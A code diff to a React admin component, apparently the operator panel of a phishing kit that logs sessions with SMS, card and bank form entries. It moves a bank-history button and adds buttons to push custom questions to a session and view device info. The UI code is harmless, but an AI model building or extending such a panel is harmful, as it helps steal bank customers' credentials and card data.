@@ -2378,32 +2378,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           })}
                         </div>
 
-                        {/* 3) ALT: Alanlarin TAM ALTINDA (sms/kart gibi flex-col sonda) GEÇMİŞ (N) BUTONU —
-                             artik cok sagda DEGIL, kolonun sol tarafinda, alanlarin hemen altinda.
-                             ⭐⭐⭐ KALICI: bankHistoryCount = 0 OLSADA (0 kayit) BUTONU GÖSTER (0 yazdir)
-                                 Kullanici butonun var oldugunu GORSUN. SMS/KART > 0 ? idi, banka HER ZAMAN goster! */}
-                        <div className="mt-1 flex w-full justify-start">
-                          <button
-                            type="button"
-                            onClick={() =>
-                              setExpandedBankHistorySessionId(
-                                expandedBankHistorySessionId === row.id ? null : row.id,
-                              )
-                            }
-                            className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
-                              expandedBankHistorySessionId === row.id
-                                ? darkMode
-                                  ? "border-amber-500/40 bg-amber-500/15 text-amber-400 hover:bg-amber-500 hover:text-white"
-                                  : "border-amber-500/40 bg-amber-500/15 text-amber-500 hover:bg-amber-500 hover:text-white"
-                                : darkMode
-                                  ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
-                                  : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
-                            }`}
-                            title="Eski banka form girişlerini göster"
-                          >
-                            GEÇMİŞ ({bankHistoryCount})
-                          </button>
-                        </div>
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
@@ -2577,8 +2551,22 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Canlı Destek">
                             <span>💬</span>
                           </button>
+                          <button onClick={() => setQuestionPromptSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 hover:bg-violet-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Özel Soru Sor">
+                            <span>❓</span>
+                          </button>
                           <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
                             <span>📱</span>
+                          </button>
+                          <button
+                            onClick={() =>
+                              setExpandedBankHistorySessionId(
+                                expandedBankHistorySessionId === row.id ? null : row.id,
+                              )
+                            }
+                            className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 hover:bg-amber-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide"
+                            title="Önceki Giriş Kayıtları (Geçmiş)"
+                          >
+                            <span>📜</span>
                           </button>
                           {isDeletedMode ? (
                             <>
